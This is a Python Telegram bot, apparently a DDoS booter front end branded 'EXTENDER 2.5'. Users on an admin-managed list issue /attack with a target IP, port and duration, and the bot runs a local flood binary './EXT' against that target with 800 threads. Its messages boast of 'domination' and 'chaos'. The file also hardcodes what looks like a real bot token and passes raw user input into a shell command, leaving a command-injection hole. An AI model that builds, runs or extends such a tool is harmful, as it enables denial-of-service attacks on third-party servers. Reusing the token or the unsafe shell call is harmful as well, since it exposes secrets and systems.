import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from keep_alive import keep_alive

keep_alive()

TELEGRAM_BOT_TOKEN = '7283756422:AAHIHrM-NNxYweWyyQsOWu2Kk1r4yxOlHYc'
ADMIN_USER_ID = 7903853982
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "🌹 *𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐄𝐗𝐓𝐄𝐍𝐃𝐄𝐑 𝟐.𝟓™* 🌹\n\n"
        "🔥 *𝐓𝐡𝐞 𝐔𝐥𝐭𝐢𝐦𝐚𝐭𝐞 𝐃𝐨𝐦𝐢𝐧𝐚𝐭𝐢𝐨𝐧 𝐓𝐨𝐨𝐥* 🔥\n\n"
        "💡 *𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:* 💡\n"
        "`/attack <ip> <port> <duration>` - 🎯 Launch an attack\n"
        "`/manage <add|rem> <user_id>` - 👑 Manage users (Admin only)\n\n"
        "✨ *𝐓𝐚𝐤𝐞 𝐜𝐨𝐧𝐭𝐫𝐨𝐥. 𝐍𝐨 𝐦𝐞𝐫𝐜𝐲.* ✨"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="🚫 *Access Denied! Admin permissions required.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="ℹ️ *Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"✅ *User {target_user_id} has been added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"❌ *User {target_user_id} has been removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./EXT {ip} {port} {duration} 800",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error during attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack completed successfully!*\n🔥 *Thank you for using EXTENDER 2.5™.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *You are not authorized to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ *An attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="ℹ️ *Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"🔥 *Attack initiated!*\n\n"
        f"🎯 *Target: {ip}:{port}*\n"
        f"⏱️ *Duration: {duration} seconds*\n\n"
        f"✨ *Let the chaos begin!* ✨"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()